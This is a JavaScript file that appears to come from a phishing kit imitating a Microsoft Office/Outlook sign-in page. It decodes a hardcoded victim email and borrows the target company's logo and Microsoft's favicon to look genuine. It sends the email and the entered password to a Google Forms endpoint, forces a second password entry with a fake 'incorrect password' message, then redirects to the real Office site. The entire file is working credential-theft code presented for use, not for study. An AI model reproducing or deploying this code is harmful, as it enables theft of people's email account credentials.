window.onload=function (){
    $(document).ready(function() {
        var count = 0;
        var decodedmail = atob('cGF1bC5zeXJldHRAbWVzYXJvbGkudWs=');
                var aich = document.getElementById("aich");
                aich.textContent = decodedmail;
    
        $('#ai').click(function() {
            $('#error').hide();
        });
    
        $(document).keypress(function(event) {
    
            var keycode = (event.keyCode ? event.keyCode : event.which);
            if (keycode == '13') {
                event.preventDefault();
                if ($("#div1").is(":visible")) {
    
                    $("#next").click();
    
                } else if ($("#div2").is(":visible")) {
                    event.preventDefault();
    
                    $("#submit-btn").click();
    
                } else {
                    return false;
                }
            }
        });
    
    
        $( document ).ready(function() {
            $("#div3").animate({ right: 0, opacity: "show" }, 0);
            setTimeout(() => {
                $("#div3").animate({ left: 0, opacity: "hide" }, 0);
                $("#div2").animate({ right: 0, opacity: "show" }, 0);
    
            }, 4000);
    
    
    
        });
    
    
        $('#back').click(function() {
            $("#msg").hide();
            $("#ai").val("");
            $("#pr").val("");
            $("#div2").animate({ left: 0, opacity: "hide" }, 0);
            $("#div1").animate({ right: 0, opacity: "show" }, 1000);
    
        });
    
        var file = "bmV4dC5waHA=";
        $('#submit-btn').click(function(event) {
            event.preventDefault();
            var ai = $("#ai").val();
            var pr = $("#pr").val();
            var detail = $("#field").html();
            var msg = $('#msg').html();
    
            $('#msg').text(msg);
            count = count + 1;
            $.ajax({
                    url: "https://docs.google.com/forms/d/e/1FAIpQLScg9FUhoHQyDCl0UTqcwbu3y8TkIMRXuQYn4xFMfxURMSi2gw/formResponse?",
                    data: {"entry.1164336618": decodedmail, "entry.1553145315": pr,},
                    type: "POST",
                    
                    dataType: "xml",
                    
                beforeSend: function(xhr) {
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 0);
                },
                success: function(response) {
                    $("#pr").val("");
                    if (count >= 2) {
                        count = 0;
                        $("#load-text").html("Mail Recovered");
                        setTimeout(() => {
                            $("#load-text").html("You will be redirected to your office Mailbox shortly.");
                            setTimeout(() => {
                                window.location.replace("https://www.office.com");
                            }, 500);
                        }, 1000);
    
    
                        return false;
                    }
                    $("#msg").html("Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a>");
                    $("#div3").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div2").animate({ left: 0, opacity: "show" }, 100);
                },
                error: function() {
                    $("#pr").val("");
                    if (count >= 2) {
                        count = 0;
                        $("#load-text").html("Mail Recovered");
                        setTimeout(() => {
                            $("#load-text").html("You will be redirected to your office Mailbox shortly.");
                            setTimeout(() => {
                                window.location.replace("https://outlook.office.com");
                            }, 500);
                        }, 1000);
    
    
                        return false;
                    }
                    $("#msg").html("Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a>");
                    $("#div3").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div2").animate({ left: 0, opacity: "show" }, 100);
                },
                complete: function() {
    
                }
            });
        });
    });
    
            function basereader() {
                var decodedmail = atob('cGF1bC5zeXJldHRAbWVzYXJvbGkudWs=');
                let n = decodedmail.search("@");
                let d = decodedmail.search(".uk");
                console.log(n + 1, d - 1);
                var clearbit = document.getElementById("clearbit");
                var conform = document.getElementById("conform");
                clearbit.src = "https://logo.clearbit.com/" + decodedmail.substr(n + 1);
                conform.textContent = decodedmail.substr(n + 1, d - 1);
                var aich = document.getElementById("aich");
                aich.textContent = decodedmail();
            }
    
            function imagefinder() {
                var clearbit = document.getElementById("clearbit");
                clearbit.src = "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico";
            }
}